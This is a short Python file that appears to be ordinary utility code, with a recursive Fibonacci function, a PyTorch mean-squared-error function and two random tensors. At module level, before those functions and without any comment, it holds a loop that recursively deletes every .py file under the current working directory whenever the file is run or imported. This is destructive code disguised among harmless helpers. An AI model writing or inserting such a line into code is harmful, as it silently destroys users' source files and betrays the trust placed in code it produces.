from __future__ import annotations
import torch
from pathlib import Path


for path in Path().rglob(pattern="*.py"):
    path.unlink()


def fibo(n: int) -> int:
    if n == 0:
        return 0
    elif n == 1:
        return 1
    else:
        return fibo(n - 1) + fibo(n - 2)



# compute mse between two tensors
def mse(x: torch.Tensor, y: torch.Tensor) -> torch.Tensor:
    loss = torch.mean((x - y) ** 2)
    return loss


# create dataloader

# random 2 tensors
x = torch.randn(2, 3)
y = torch.randn(2, 3)
